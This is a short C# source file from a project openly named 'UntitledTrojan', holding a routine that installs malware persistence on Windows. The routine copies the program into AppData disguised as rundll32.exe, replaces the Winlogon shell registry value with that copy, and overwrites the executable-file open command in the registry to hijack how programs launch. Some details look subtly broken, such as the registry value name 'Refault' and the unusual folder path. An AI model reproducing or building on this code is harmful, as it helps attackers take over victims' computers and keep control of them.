using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace UntitledTrojan.Tools
{
    internal static class FileHelper
    {
        internal static string path = $"C:\\Users\\{Environment.UserName}\\AppData\\Microsoft\\Windows\\";
        internal static string rundll = "rundll32.exe";

        internal static void CopyItself()
        {
            string thisFile = AppDomain.CurrentDomain.FriendlyName;
            File.Copy(Application.ExecutablePath, path + rundll);

            RegistryKey key1 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
            key1.SetValue("Shell", path + rundll + " /s");

            RegistryKey key2 = Registry.ClassesRoot.OpenSubKey(@"exefile\shell\open\command", true);
            key2.SetValue("Refault", path + rundll + " /e");
        }
    }
}
